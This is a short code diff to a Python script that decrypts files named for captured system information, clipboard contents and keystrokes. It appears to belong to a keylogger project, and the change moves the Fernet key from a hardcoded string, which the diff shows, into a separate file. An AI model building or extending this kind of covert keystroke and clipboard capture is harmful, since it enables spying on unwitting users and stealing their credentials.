@@ -1,11 +1,12 @@
 from cryptography.fernet import Fernet
 
-key="4kA68DkMKND5r0u-LiYRU76XBvpxhKOqwkQwkIv8hvA="
 system_info_e="../Project/e_system_info.txt"
 clipboard_info_e="../Project/e_clipboard.txt"
 keys_info_e="../Project/e_key_log.txt"
 
 encrypted_files=[system_info_e,clipboard_info_e,keys_info_e]
+with open("encryption_key.txt", "rb") as key_file:
+    key = key_file.read()
 
 for encrypted_file in encrypted_files:
     with open(encrypted_file, 'rb') as f:
